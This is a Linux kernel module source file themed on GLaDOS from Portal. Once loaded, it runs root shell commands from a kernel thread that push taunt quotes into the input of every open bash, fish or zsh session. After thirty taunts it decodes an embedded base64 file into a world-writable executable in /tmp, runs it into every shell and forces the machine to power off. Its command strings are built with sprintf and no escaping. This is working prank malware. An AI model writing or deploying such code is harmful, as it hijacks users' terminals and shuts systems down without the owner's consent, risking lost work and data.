#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/timer.h>
#include <linux/kthread.h>
#include <linux/delay.h>

#define FILENAME "/tmp/song"
#define INTERVAL_SECONDS 90

int stop;
struct task_struct *task;

static char *envp[] = {
    "SHELL=/bin/bash",
    "HOME=/root",
    "USER=root",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",
    "DISPLAY=:0",
    "PWD=/root",
    NULL
};

#define SAY "/usr/bin/pgrep -f 'bash|fish|zsh' | /usr/bin/xargs /usr/bin/printf '/proc/%%d/fd/0\n' | /usr/bin/xargs -I file /bin/sh -c 'echo %s > file &'"

static void GLaDOS_say(char *message) {
    char cmd[512];
    char *argv[] = { "/bin/bash", "-c", cmd, NULL };

    sprintf(cmd, SAY, message);
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

char *quotes[] = {
#include "quotes.txt"
NULL };

int taunt_counter = 0;

static void GLaDOS_taunt(void) {
    if(taunt_counter < 30) {
        GLaDOS_say(quotes[taunt_counter]);
        taunt_counter++;
    }
    else if (taunt_counter == 30) {
        char *cake = "/bin/echo "
        #include "song/song_b64.txt"
        " | /usr/bin/base64 -d > " FILENAME "; /bin/chmod 777 " FILENAME "; "
        "/usr/bin/pgrep -f 'bash|fish|zsh' | /usr/bin/xargs /usr/bin/printf '/proc/\%d/fd/0\n' | /usr/bin/xargs -I file /bin/sh -c '" FILENAME " > file; '"
        "shutdown -P now";

        char *argv[] = { "/bin/bash", "-c", cake, NULL };
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        taunt_counter++;
    }
}

int GLaDOS_thread(void *data) {
    stop = 0;

    while(true) {
        #ifdef DEBUG
        printk("[GLaDOS][+] cake\n");
        #endif

        GLaDOS_taunt();
        msleep_interruptible(INTERVAL_SECONDS * 1000);

        if(stop) return 0;
    }
}

static int __init GLaDOS_init(void) {
    #ifdef DEBUG
    printk("[GLaDOS][+] installed\n");
    #endif

    task = kthread_run(&GLaDOS_thread, NULL, "GLaDOS");

    return 0;
}

static void __exit GLaDOS_exit(void) {
    stop = 1;
    kthread_stop(task);

    #ifdef DEBUG
    printk("[GLaDOS][+] uninstalled\n");
    #endif

    return;
}

module_init(GLaDOS_init);
module_exit(GLaDOS_exit);

#define DRIVER_AUTHOR "GLaDOS"
#define DRIVER_DESC "This is your fault. It didn't have to be like this."

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_LICENSE("GPL");
